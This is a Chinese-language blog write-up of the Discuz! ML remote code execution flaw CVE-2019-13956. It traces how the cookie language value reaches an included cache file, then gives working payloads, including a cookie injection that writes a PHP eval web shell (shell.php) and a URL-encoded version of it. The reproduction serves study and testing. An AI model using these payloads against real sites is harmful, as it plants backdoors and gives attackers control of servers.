# Discuz! ML远程代码执行(CVE-2019-13956) - 雨中落叶 - 博客园

> 原文：[https://www.cnblogs.com/yuzly/p/11386755.html](https://www.cnblogs.com/yuzly/p/11386755.html)

Discuz! ML远程代码执行(CVE-2019-13956)

**一、漏洞描述**

该漏洞存在discuz ml(多国语言版)中,cookie中的language可控并且没有严格过滤,导致可以远程代码执行。

**二、漏洞影响版本**

Discuz! ML V3.2

Discuz! ML V3.3

Discuz! ML V3.4

**三、漏洞环境搭建**

1、 官网下载Discuz! ML V3.4,下载地址: [http://discuz.ml/download](http://discuz.ml/download)

2、 将压缩包解压到phpstudy网站根目录,浏览器访问upload目录开始安装

　　![](../Images/026e95a59e62c1a1d5f2322380dca5ea.png)

3、然后就是一直点击下一步就可以了,直到完成安装

　　![](../Images/b6fed457ba4b35ab9eb3a1bc35117d63.png)

**四、漏洞复现**

1、漏洞存在的位置/upload/source/module/portal/portal_index.php,使用template函数处理’diy:portal/index’,然后使用include_once包含

　　![](../Images/9df1eac4559bef8aff99ddd4779df6d4.png)

2、跟进template函数,发现把DISCUZ_LANG函数拼接成为一个缓存文件名,然后又返回了缓存文件名

　　![](../Images/a738d7ecb77d6d14fc17109b3e898488.png)

3、跟进DISCUZ_LANG函数,发现从cookie中取language的值给$lng

　　![](../Images/5dde7f8aceb04e2375826d2fc90833f9.png)

4、继续浏览代码,发现把$lng的值赋给DISCUZ_LANG了

　　![](../Images/3e38e799dc0d499c177e455672bba312.png)

5、到此为止,整个漏洞分析过程已结束,过程如下:

外部参数$lng(即cookie中的language语言)可控,导致DISCUZ_LANG函数获取$lng,然后拼接成缓存文件并且返回了缓存文件名,导致template函数生成的缓存文件名可控,插入自己的代码,最终include_once函数包含一下导致了代码注入(执行了插入恶意代码的缓存文件名)。

6、测试漏洞,随便点击一个页面,抓包,将Cookie中的xxx_language参数值改为’.phpinfo().’,发现成功执行了代码

　　![](../Images/8e0efdd6b217fdb5014ee9e363b7d692.png)

7、查看缓存文件,发现缓存文件名被修改如下

　　![](../Images/e27fdc6de042bc32f7e81eccc64c0ed9.png)

8、getshell

8.1尝试上传一个shell,构造payload,如下:

'.file_put_contents('shell.php','<?php eval($_POST[cmd]);?>').'

执行提示错误,可能是编码的原因

　　![](../Images/8fe5500586ee59e41834d19f2d9e6840.png)

8.2、尝试对payload进行全部编码,失败,只有使用如下payload才能成功

%27.+file_put_contents%28%27shell.php%27%2Curldecode%28%27%253c%253fphp+%2520eval%28%2524_%2550%254f%2553%2554%255b%2522cmd%2522%255d%29%253b%253f%253e%27%29%29.%27

　　![](../Images/63ac3581f46c895fa5e2ff0e2487d2b0.png)

8.3、查看是否成功上传shell.php,发现成功上传

　　![](../Images/0478396dac1993a13357c4a2e7366caa.png)

8.4、菜刀连接

　　![](../Images/f6569c7d1f8ead19b951d72573ffa267.png)

----------------------------------------------------------------------------------------

工具检测:https://github.com/theLSA/discuz-ml-rce

参考: https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&mid=2247483944&idx=1&sn=ba9f6f99967e31fd56634f714d8ae650&scene=21#wechat_redirect